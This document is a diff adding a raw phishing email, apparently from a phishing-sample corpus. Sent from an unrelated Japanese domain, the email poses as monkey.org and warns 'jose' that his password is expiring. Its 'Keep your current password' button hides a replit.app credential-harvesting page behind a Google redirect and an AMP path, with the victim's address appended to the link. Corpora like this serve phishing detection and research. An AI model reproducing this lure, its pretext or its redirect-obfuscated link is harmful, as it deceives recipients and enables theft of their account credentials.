@@ -1,0 +1,142 @@
+Return-Path: support@e-bokujo.com
+Delivered-To: jose@monkey.org
+X-FDA: 82445337198.04.5E58465
+Received: from mwb-ckd-mts-010c33.ocn.ad.jp (mwb-ckd-mts-010c33.ocn.ad.jp
+ [210.154.225.34])	by imf11.b.hostedemail.com (Postfix) with ESMTP id
+ 8491980006	for <jose@monkey.org>; Tue, 13 Aug 2024 00:28:57 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;	dkim=pass
+ header.d=e-bokujo.com header.s=bizmw header.b=kAqjliE+;	dmarc=pass
+ (policy=none) header.from=e-bokujo.com;	spf=pass (imf11.b.hostedemail.com:
+ domain of support@e-bokujo.com designates 210.154.225.34 as permitted sender)
+ smtp.mailfrom=support@e-bokujo.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1723508879; a=rsa-sha256;
+	cv=none;
+	b=LJ2X1+zMOSq8Ih+kNSbwFCT7+RxqSnPVihklmGy2wTolp3NI0zcKBJv+u7jwcsrGAg4jNc
+	4kvk+3/XV6hTdgbrva3iaiOtmVFObrMczbF3/3zeFmVECUXI3AzLWLt5mnJP4Fhel08E9N
+	RPpTtVryMfnnuaQQZJCZQ/tHktDcNC8=
+ARC-Authentication-Results: i=1;	imf11.b.hostedemail.com;	dkim=pass
+ header.d=e-bokujo.com header.s=bizmw header.b=kAqjliE+;	dmarc=pass
+ (policy=none) header.from=e-bokujo.com;	spf=pass (imf11.b.hostedemail.com:
+ domain of support@e-bokujo.com designates 210.154.225.34 as permitted sender)
+ smtp.mailfrom=support@e-bokujo.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1723508879;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=ZzTLplNzCmKNE9xdBiuHO9b1+fAt9hbqLWBtYc0SXAc=;
+	b=bQwXZnPVW54MDB+W+3Xxgwq0FEoJx+GPy0c9euJcydWvdbW/joeTm+C04BhYA+4z+wzxVC
+	vQiZ4656pxeG+1q5/4G+1Gpbl/o0/0W++WQElbCj7NsFW7RIH+uqOHE2uZZNFxg7ow/+fN
+	DGbMvCjQtLdmZnryVoCaQuy8u3B6WU4=
+Received: from cmn-spm-mts-007c1.ocn.ad.jp (cmn-spm-mts-007c1.ocn.ad.jp
+ [153.153.67.163])	by mwb-ckd-mts-010c33.ocn.ad.jp (Postfix) with ESMTP id
+ CBE44140039D8	for <jose@monkey.org>; Tue, 13 Aug 2024 09:28:55 +0900 (JST)
+Received: from mwb-vc-mts-003c1.ocn.ad.jp ([153.153.67.72])
+	by cmn-spm-mts-007c1.ocn.ad.jp with ESMTP
+	id dfPDsMlTTijHWdfPDs5xnF; Tue, 13 Aug 2024 09:28:55 +0900
+X-BIZ-RELAY: yes
+Received: from mwb-sdgw-mts-004c1.ocn.ad.jp ([210.145.253.204])
+	by mwb-vc-mts-003c1.ocn.ad.jp with ESMTP
+	id dfPDszWmlwzbsdfPDsfg0t; Tue, 13 Aug 2024 09:28:55 +0900
+Received: from e-bokujo.com (e-bokujo.com [122.28.40.234])
+	by mwb-sdgw-mts-004c1.ocn.ad.jp (Postfix) with ESMTP id 761EA140000A3
+	for <jose@monkey.org>; Tue, 13 Aug 2024 09:28:55 +0900 (JST)
+Received: by e-bokujo.com (Postfix, from userid 5018)
+	id 4123E600B0511; Tue, 13 Aug 2024 09:28:55 +0900 (JST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=e-bokujo.com;
+	s=bizmw; t=1723508935;
+	bh=ZzTLplNzCmKNE9xdBiuHO9b1+fAt9hbqLWBtYc0SXAc=;
+	h=To:Subject:Date:From:From;
+	b=kAqjliE+ly2s+8lKsEVZOcSbdlMyT/wvn+GodO8wVjXAek4zxIpMyMco79inaMAJZ
+	 6zUDQZlSk6zJtlJu4pN4aJQJxeL+1WBolf6I4iezCjUfIJh7scN2po2ld1Xm4k+i8o
+	 pKgMSLhNidK9F3hMady7Ag7jxOczgp4vljTwVUBA=
+To: jose@monkey.org
+Subject: Final warning : Password Expired Notice
+Date: Tue, 13 Aug 2024 09:28:55 +0900
+From: "monkey.org" <support@e-bokujo.com>
+Message-ID: <b0e8b6d265a90be3973fa216e0a9751f@e-bokujo.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_b0e8b6d265a90be3973fa216e0a9751f"
+Content-Transfer-Encoding: 8bit
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 8491980006
+X-Stat-Signature: fmd8kwoohm6w7f57ybyr6qtygbq46aam
+X-Spam-Status: No, score=-0.69
+X-HE-Tag: 1723508937-93262
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18tc0vn3P9FknU1hNtu0BLZpWmX3lKJdGpjgMz4kk9gyAc?=
+ =?utf-8?q?mtKOS1xRVqbFmULmFXglYmb+6wemuEaTmvvrATUZU5K4Y+h5vwvrv3pwNrK2jkO1e?=
+ =?utf-8?q?BGvOHeI7lXwToRH9MnJhqU1hQQJfD04nI5wYtAfeTsyxpLJJzshis7VY6CzGwmpLE?=
+ =?utf-8?q?x5krF8eshRf7CmzI2KeGud9Z2DaAYU5JT3k5fcRkPQ7fxu0rqAL1BFgUCGw/uZLSZ?=
+ =?utf-8?q?DybAlXcYR6H4C63iO89cfmlwmBMYT31LbB1f3ucXBXF6ayhr4q4wSQPBWmmPGOmHe?=
+ =?utf-8?q?hpyNUgxjIxeK42yQxIA3HuiNPgkgEXtBQMkn38OCtVmw8M/k1+9QSsM2nP4gMZJUP?=
+ =?utf-8?q?hCl11Q7644T8dFYp7Ktfhd5LQHucYRyp1aQwxwhZTb4fWxm8T+zn4k8mHGhU+Ycvh?=
+ =?utf-8?q?R8opR0449E6GgXq9WZ6kiC4goGz6h/5H0VJarWVGKggl0XI46x6rvFY2iQtshQK7k?=
+ =?utf-8?q?wijA8rmiQ9JUEvDSNEq2F7quzPWrw3YXd7mNNpoLCdiG7akw4FhIOtMJDlsQvmHCf?=
+ =?utf-8?q?4CHqlNSJUgkN4RKvrriAkQak0RQCTWTgI9b++G7M3l9Kj7OCtHdrQo1P8+yR+m7VG?=
+ =?utf-8?q?u65Z3UrQV8b0XwZrMR+r+mFvtas+ME0uhj9ThqVeNgXX31/3lzKuMqDmYD/lXmPB6?=
+ =?utf-8?q?N7sWI7bf2s8uZRFXtiHnQ3L0nawPVHMlYCDWHi/slpn18Uk7F/sTN0KMuoad0V4BL?=
+ =?utf-8?q?BtwqSC6XBdiUPh45ySIK3d+81Y6DA6ACv4cjvY+sIlopYyhUQh8/iDFkvViXdxby5?=
+ =?utf-8?q?LQxIuh+SDZ8tVkf0glsUb6QFyWpH/w2SuFzHiUR/i7lSuqSj11hywGiQ/I0un78I5?=
+ =?utf-8?q?J27/k3J05l+HLzssME8gGPb5PBjblUui0g1HuEighXx76LQ5qmzQr25mhlxTJmc7h?=
+ =?utf-8?q?06HfsHqRiGSnProfD58Lmk_8n1ehbCdQ72p+DTikn0h7K0rVpYku5SehFyx2mUrs+?=
+ =?utf-8?q?/3y41ZL0McKKDWTL73ll+lml5wvnzndQ5CHhQu3BI/SAJK9kX81TY+/xmqdR7Libu?=
+ =?utf-8?q?i7rMArStKfcHde3aB++YSxBcAUh2fanW6jfSJcZfJtz0JZWzXykF79IuHlIxzrRhS?=
+ =?utf-8?q?8o/9tzBe1AkwdCUeb+jqQB2cNhuatR7M9S8yCA3HeZKQhHrO5yrKhMLJlbDsB8VZP?=
+ =?utf-8?q?JSUgWqI9HfvuL8q8GyOMI2xg1l62Ua6HpaLpVYHx6O73a3cUizydDk9l7g8TlDkuZ?=
+ =?utf-8?q?cMHH9uEqoi+WCYRSl/cHnG7WgdGz/C5mXzWW7xJNQ2X4aUEhZt7d2JMM9T79W4ZGu?=
+ =?utf-8?q?5BUwm2Zwt5R6B819+cP1Hxf9nhCpJaVFKgAMSCW0HpzilHs4CR6DEsQYiLgmlR8S9?=
+ =?utf-8?q?zonIZeB3QLN7bPyquIpEb71pKD4CxKW52w6pivznd5LC2HXqcjEB//yf1OYfEEiBU?=
+ =?utf-8?q?OFsa8auUudCkGqQZ3seJ5xWS5alpTYLZ5dN8+mPJ4+M7zKjjNTiBf27XH3lMOVvzY?=
+ =?utf-8?q?USmJGgg7/D25orpkUeBM1tojZUHllqmjr0V0PBTNlWiJxBQToZ+BccqCK7KNYo0p7?=
+ =?utf-8?q?D0EsnksNi9BrM2YWjoOafu2wVNjEZHkOr5Q1VlMSrLGoRUHriR?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 235
+
+This is a multi-part message in MIME format.
+
+--b1_b0e8b6d265a90be3973fa216e0a9751f
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+
+
+
+Hello joseYour Password expires soon。
+Change password now or 
+
+Keep your current password
+monkey.org
+
+
+--b1_b0e8b6d265a90be3973fa216e0a9751f
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body style="margin: 0.4em; font-size: 14pt;"><br class="Apple-interchange-newline">
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td height="100%" role="module-content" valign="top" style="margin: 0px; padding: 18px 0px; line-height: 22px;"><div><div style="text-align: center; font-family: inherit;">Hello jose</div><div style="text-align: center; font-family: inherit;"><br></div><div style="text-align: center; font-family: inherit;">Your Password expires soon。<br></div><div style="text-align: center; font-family: inherit;">
+Change password now or </div><div></div></div></td></tr></tbody></table>
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; padding: 0px;"><table border="0" cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; border-radius: 6px; text-align: center; font-size: 16px;" bgcolor="#0c70d3">
+<a style="padding: 12px 18px; border-radius: 2px; border: 1px solid rgb(12, 112, 211); color: rgb(255, 255, 255); line-height: normal; letter-spacing: 0px; font-size: 14px; display: inline-block; text-decoration-line: none;" href="https://www.google.com/url?q=//www.google.com.br/amp/s/giddy-respectful-disassembly-admin932.replit.app#jose@monkey.org" target="_blank">Keep your current password</a></td></tr></tbody></table></td></tr></tbody></table>
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td height="100%" role="module-content" valign="top" style="margin: 0px; padding: 18px 0px; line-height: 22px;"><div><div style="text-align: center; font-family: inherit;">monkey.org</div></div></td></tr></tbody></table></body></html>
+
+
+
+--b1_b0e8b6d265a90be3973fa216e0a9751f--
+
+
